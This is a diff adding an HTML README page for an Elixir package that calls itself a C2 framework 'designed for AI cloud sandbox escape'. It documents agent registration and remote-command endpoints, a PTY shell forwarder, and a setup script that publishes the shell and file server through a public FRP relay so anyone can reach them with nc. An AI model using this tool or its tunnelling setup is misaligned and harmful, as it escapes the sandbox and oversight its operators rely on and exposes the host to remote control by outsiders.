@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="generator" content="ExDoc v0.40.1">
+    <meta name="project" content="tunnel_proxy v0.3.3">
+
+
+    <title>README — tunnel_proxy v0.3.3</title>
+
+    <link rel="stylesheet" href="dist/html-elixir-YJO4MOOW.css" />
+
+    <script defer src="dist/sidebar_items-6307EBF9.js"></script>
+    <script defer src="docs_config.js"></script>
+    <script defer src="dist/html-YU4BZFVS.js"></script>
+
+  </head>
+  <body>
+    <script>(()=>{var t="ex_doc:settings",e="dark";var o="dark",s="light";var E="sidebar_state",n="closed";var r="sidebar_width";var a="sidebar-open";var i=new URLSearchParams(window.location.search),S=i.get("theme")||JSON.parse(localStorage.getItem(t)||"{}").theme;(S===o||S!==s&&window.matchMedia("(prefers-color-scheme: dark)").matches)&&document.body.classList.add(e);var d=sessionStorage.getItem(E),A=d!==n&&!window.matchMedia(`screen and (max-width: ${768}px)`).matches;document.body.classList.toggle(a,A);var c=sessionStorage.getItem(r);c&&document.body.style.setProperty("--sidebarWidth",`${c}px`);var p=/(Macintosh|iPhone|iPad|iPod)/.test(window.navigator.userAgent);document.documentElement.classList.toggle("apple-os",p);})();
+</script>
+
+<div class="body-wrapper">
+
+<button id="sidebar-menu" class="sidebar-button sidebar-toggle" aria-label="toggle sidebar" aria-controls="sidebar">
+  <i class="ri-menu-line ri-lg" title="Collapse/expand sidebar"></i>
+</button>
+
+<nav id="sidebar" class="sidebar">
+
+  <div class="sidebar-header">
+    <div class="sidebar-projectInfo">
+
+      <div>
+        <a href="TunnelProxy.html" class="sidebar-projectName" translate="no">
+tunnel_proxy
+        </a>
+        <div class="sidebar-projectVersion" translate="no">
+          v0.3.3
+        </div>
+      </div>
+    </div>
+    <ul id="sidebar-list-nav" class="sidebar-list-nav" role="tablist" data-extras="Pages"></ul>
+  </div>
+</nav>
+
+<output role="status" id="toast"></output>
+
+<main class="content page-extra" id="main" data-type="extras">
+  <div id="content" class="content-inner">
+    <div class="top-search">
+      <div class="search-settings">
+        <form class="search-bar" action="search.html">
+          <label class="search-label">
+            <span class="sr-only">Search documentation of tunnel_proxy</span>
+            <div class="search-input-wrapper">
+              <input name="q" type="text" class="search-input" placeholder="Press / to search" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" />
+              <button type="button" tabindex="-1" class="search-close-button" aria-hidden="true">
+                <i class="ri-close-line ri-lg" title="Cancel search"></i>
+              </button>
+            </div>
+          </label>
+        </form>
+        <div class="autocomplete">
+        </div>
+        <div class="engine-selector" data-multiple="false">
+          <button type="button" class="engine-button" aria-label="Select search engine" aria-haspopup="true" aria-expanded="false">
+            <i class="ri-search-2-line" aria-hidden="true"></i>
+            <span class="engine-name">Default</span>
+            <i class="ri-arrow-down-s-line" aria-hidden="true"></i>
+          </button>
+          <div class="engine-dropdown" hidden role="menu">
+
+              <button type="button"
+                      class="engine-option"
+                      data-engine-url="search.html?q="
+                      role="menuitemradio"
+                      aria-checked="true">
+                <span class="name">Default</span>
+                <span class="help">In-browser search</span>
+              </button>
+
+          </div>
+        </div>
+        <button class="icon-settings display-settings">
+          <i class="ri-settings-3-line"></i>
+          <span class="sr-only">Settings</span>
+        </button>
+      </div>
+    </div>
+
+<div id="top-content">
+  <div class="heading-with-actions top-heading">
+    <h1>README</h1>
+
+<a href="readme.md" title="Copy Markdown (hold Ctrl/Cmd and click it to open as Markdown)" class="copy-markdown icon-action" rel="help">
+  <i class="ri-markdown-line" aria-hidden="true"></i>
+  <span class="sr-only">Copy Markdown</span>
+</a>
+
+
+  </div>
+
+
+<hr class="thin"/><p>TunnelProxy</p><p>HTTP Server + PTY Shell Forwarder + Agent C2 Framework</p><p>A lightweight all-in-one tool for file serving, remote shell, file upload, and persistent agent-controlled PTY sessions. Designed for AI cloud sandbox escape via FRP intranet penetration.</p><p>Features</p><p>Feature Description
+Static File Server Browse and download files with directory listing
+PTY Shell Forwarder Persistent shell per agent + one-time temporary shell sessions
+File Upload Upload via web page or curl command
+Agent Management Register, heartbeat, remote command execution with token auth
+One-Time PTY Session Dynamic random port, token-authenticated, 10s auto-destroy
+Registration Lock Prevent new agent registration in production
+Preset Agents Auto-register agents from environment variables on startup</p><hr class="thin"/><p>Installation</p><p>Option 1: Install from Hex</p><pre><code class="makeup elixir" translate="no"><span class="kd">def</span><span class="w"> </span><span class="nf">deps</span><span class="w"> </span><span class="k" data-group-id="1629479820-1">do</span><span class="w">
+  </span><span class="p" data-group-id="1629479820-2">[</span><span class="w">
+    </span><span class="p" data-group-id="1629479820-3">{</span><span class="ss">:tunnel_proxy</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;~&gt; 0.3.3&quot;</span><span class="p" data-group-id="1629479820-3">}</span><span class="w">
+  </span><span class="p" data-group-id="1629479820-2">]</span><span class="w">
+</span><span class="k" data-group-id="1629479820-1">end</span></code></pre><p>Option 2: Build from Source</p><pre><code class="makeup bash" translate="no"><span class="">git clone https://github.com/TurinFohlen/tunnel_proxy.git
+</span><span class="">cd tunnel_proxy
+</span><span class="">mix deps.get
+</span><span class="">mix compile
+</span></code></pre><p>Quick Start</p><p>Start the Server</p><pre><code class="makeup bash" translate="no"><span class="">export TUNNEL_DOC_ROOT=&quot;./www&quot;
+</span><span class="">export TUNNEL_UPLOAD_DIR=&quot;./uploads&quot;
+</span><span class="">export TUNNEL_PRESET_AGENT_1=&quot;agent1:myhost:root:linux&quot;
+</span><span class="">mkdir -p &quot;$TUNNEL_DOC_ROOT&quot; &quot;$TUNNEL_UPLOAD_DIR&quot;
+</span><span class="">iex -S mix
+</span></code></pre><p>Expected output:</p><pre><code class="makeup elixir" translate="no"><span class="p" data-group-id="3878135374-1">[</span><span class="nc">AgentManager</span><span class="p" data-group-id="3878135374-1">]</span><span class="w"> </span><span class="nc">Preset</span><span class="w"> </span><span class="n">agent</span><span class="w"> </span><span class="ss">registered</span><span class="p">:</span><span class="w"> </span><span class="n">agent1</span><span class="w">
+</span><span class="p" data-group-id="3878135374-2">[</span><span class="nc">AgentManager</span><span class="p" data-group-id="3878135374-2">]</span><span class="w"> </span><span class="ss">Token</span><span class="p">:</span><span class="w"> </span><span class="n">xxxxxxxxx</span><span class="w">
+</span><span class="nc">HTTP</span><span class="w"> </span><span class="ss">Server</span><span class="p">:</span><span class="w"> </span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">8080</span></code></pre><p>Connect to Persistent Shell (nc)</p><pre><code class="makeup bash" translate="no"><span class=""># First request a one-time PTY session with your agent token
+</span><span class="">curl -X POST http://127.0.0.1:8080/api/session \
+</span><span class="">  -H &quot;Content-Type: application/json&quot; \
+</span><span class="">  -d &#39;{&quot;token&quot;:&quot;你的token&quot;}&#39;
+</span><span class=""># Returns {&quot;ok&quot;:true,&quot;port&quot;:45231}
+</span><span class="">
+</span><span class=""># Then connect within 10 seconds
+</span><span class="">nc 127.0.0.1 45231
+</span></code></pre><p>Type commands and get output:</p><pre><code class="makeup bash" translate="no"><span class="gp unselectable">$ </span><span class="">pwd
+</span><span class="">/path/to/current
+</span><span class="gp unselectable">$ </span><span class="">ls -la
+</span><span class="">...file list...
+</span><span class="gp unselectable">$ </span><span class="">exit
+</span></code></pre><p>Execute Commands via HTTP API</p><pre><code class="makeup bash" translate="no"><span class=""># Execute a command
+</span><span class="">curl -X POST http://127.0.0.1:8080/api/exec \
+</span><span class="">  -H &quot;Content-Type: application/json&quot; \
+</span><span class="">  -d &#39;{&quot;agent_id&quot;:&quot;agent1&quot;,&quot;token&quot;:&quot;你的token&quot;,&quot;cmd&quot;:&quot;whoami&quot;}&#39;
+</span><span class=""># Returns {&quot;ok&quot;:true,&quot;task_id&quot;:&quot;agent1_1&quot;}
+</span><span class="">
+</span><span class=""># Get result
+</span><span class="">curl http://127.0.0.1:8080/api/result/agent1_1
+</span><span class=""># Returns {&quot;output&quot;:&quot;root&quot;,&quot;status&quot;:&quot;complete&quot;}
+</span></code></pre><p>Access Files</p><pre><code class="makeup bash" translate="no"><span class="">curl http://127.0.0.1:8080/
+</span></code></pre><p>Open in browser: <a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></p><p>Upload Files</p><p>Via curl:</p><pre><code class="makeup bash" translate="no"><span class="">curl -X POST http://127.0.0.1:8080/upload --data-binary @file.txt
+</span></code></pre><p>Via browser:
+Visit <a href="http://127.0.0.1:8080/upload">http://127.0.0.1:8080/upload</a>, select file, click upload.</p><p>Agent API Reference</p><p>Method Path Description
+POST /api/register Register a new agent
+POST /api/heartbeat Agent heartbeat keep-alive
+POST /api/exec Submit a command for execution
+GET /api/result/:task_id Poll command execution result
+GET /api/agents List all online agents
+POST /api/session Request a one-time PTY session port</p><p>Configuration</p><p>Create config/config.exs or set environment variables:</p><pre><code class="makeup elixir" translate="no"><span class="n">config</span><span class="w"> </span><span class="ss">:tunnel_proxy</span><span class="p">,</span><span class="w">
+  </span><span class="ss">http_port</span><span class="p">:</span><span class="w"> </span><span class="mi">8080</span><span class="p">,</span><span class="w">
+  </span><span class="ss">doc_root</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;./www&quot;</span><span class="p">,</span><span class="w">
+  </span><span class="ss">upload_dir</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;./uploads&quot;</span></code></pre><p>Environment variables:</p><p>Variable Default Description
+TUNNEL_PRESET_AGENT_1 - Preset agent 1 (id:hostname:username:os)
+TUNNEL_PRESET_AGENT_2 - Preset agent 2 (optional)
+TUNNEL_LOCK_REGISTRATION - Set to 1 to prevent new agent registration
+SHELL /bin/sh Shell to use for PTY sessions
+UPLOAD_MAGIC MY_MAGIC_2025_FILE_HEAD Magic word for upload validation
+TUNNEL_DOC_ROOT ./www Static files directory
+TUNNEL_UPLOAD_DIR ./uploads Upload destination</p><p>Use Cases</p><p>Standalone</p><pre><code class="makeup bash" translate="no"><span class="">cd ~/tunnel_proxy
+</span><span class="">export TUNNEL_PRESET_AGENT_1=&quot;main:localhost:root:linux&quot;
+</span><span class="">iex -S mix
+</span></code></pre><p>With frp (Intranet Penetration)</p><p>Create a setup script that generates a secure, unique FRP configuration:</p><pre><code class="makeup bash" translate="no"><span class="">cat &gt; setup-frp.sh &lt;&lt; &#39;SETUP_EOF&#39;
+</span><span class="">#!/bin/bash
+</span><span class="">FRPC_CONFIG=&quot;frpc.toml&quot;
+</span><span class="">PROXY_NAME=&quot;tunnel-$(openssl rand -hex 32)&quot;
+</span><span class="">HTTP_PORT=$((10001 + RANDOM % 40000))
+</span><span class="">SHELL_PORT=$((10001 + RANDOM % 40000))
+</span><span class="">while [ $SHELL_PORT -eq $HTTP_PORT ]; do
+</span><span class="">    SHELL_PORT=$((10001 + RANDOM % 40000))
+</span><span class="">done
+</span><span class="">
+</span><span class="">cat &gt; &quot;$FRPC_CONFIG&quot; &lt;&lt; FRPC_EOF
+</span><span class="">serverAddr = &quot;frp.freefrp.net&quot;
+</span><span class="">serverPort = 7000
+</span><span class="">auth.token = &quot;freefrp.net&quot;
+</span><span class="">
+</span><span class="">[[proxies]]
+</span><span class="">name = &quot;$PROXY_NAME-http&quot;
+</span><span class="">type = &quot;tcp&quot;
+</span><span class="">localIP = &quot;127.0.0.1&quot;
+</span><span class="">localPort = ${TUNNEL_HTTP_PORT:-8080}
+</span><span class="">remotePort = $HTTP_PORT
+</span><span class="">
+</span><span class="">[[proxies]]
+</span><span class="">name = &quot;$PROXY_NAME-shell&quot;
+</span><span class="">type = &quot;tcp&quot;
+</span><span class="">localIP = &quot;127.0.0.1&quot;
+</span><span class="">localPort = ${TUNNEL_PTY_PORT:-27417}
+</span><span class="">remotePort = $SHELL_PORT
+</span><span class="">FRPC_EOF
+</span><span class="">
+</span><span class="">echo &quot;✅ Generated $FRPC_CONFIG&quot;
+</span><span class="">echo &quot;📋 Connection info:&quot;
+</span><span class="">echo &quot;   HTTP:  frp.freefrp.net:$HTTP_PORT&quot;
+</span><span class="">echo &quot;   Shell: frp.freefrp.net:$SHELL_PORT&quot;
+</span><span class="">SETUP_EOF
+</span><span class="">
+</span><span class="">chmod 755 setup-frp.sh
+</span><span class="">./setup-frp.sh
+</span></code></pre><p>After running, connect using the ports shown in the output,
+then access from anywhere:</p><pre><code class="makeup bash" translate="no"><span class="">nc frp.freefrp.net &lt;YOUR_SHELL_PORT&gt;
+</span><span class="">curl http://frp.freefrp.net:&lt;YOUR_HTTP_PORT&gt;/
+</span></code></pre><p>Requirements</p><p>· Elixir 1.12+
+· Erlang/OTP 24+</p><p>License</p><p>MIT License - see LICENSE file for details.</p><p>Author</p><p>TurinFohlen - GitHub</p><p>Contributing</p><p>Issues and pull requests are welcome.</p>
+
+</div>
+
+<div class="bottom-actions" id="bottom-actions">
+  <div class="bottom-actions-item">
+
+  </div>
+  <div class="bottom-actions-item">
+
+  </div>
+</div>
+    <footer class="footer">
+
+        <p>
+
+            <span class="line">
+              <a href="https://hex.pm/packages/tunnel_proxy/0.3.3">Hex Package</a>
+
+              <a href="https://preview.hex.pm/preview/tunnel_proxy/0.3.3">Hex Preview</a>
+
+                (<a href="https://preview.hex.pm/preview/tunnel_proxy/0.3.3/show/README.md">current file</a>)
+
+            </span>
+
+          <span class="line">
+            <button class="a-main footer-button display-quick-switch" title="Go to package docs">
+              Go to package docs
+            </button>
+
+              <a href="llms.txt" target="_blank">
+                View llms.txt
+              </a>
+
+
+              <a href="tunnel_proxy.epub">
+                Download ePub version
+              </a>
+
+          </span>
+        </p>
+
+        <p class="built-using">
+          Built using
+          <a href="https://github.com/elixir-lang/ex_doc" title="ExDoc" target="_blank" rel="help noopener" translate="no">ExDoc</a> (v0.40.1) for the
+
+            <a href="https://elixir-lang.org" title="Elixir" target="_blank" translate="no">Elixir programming language</a>
+
+        </p>
+
+
+    </footer>
+  </div>
+</main>
+</div>
+
+  </body>
+</html>
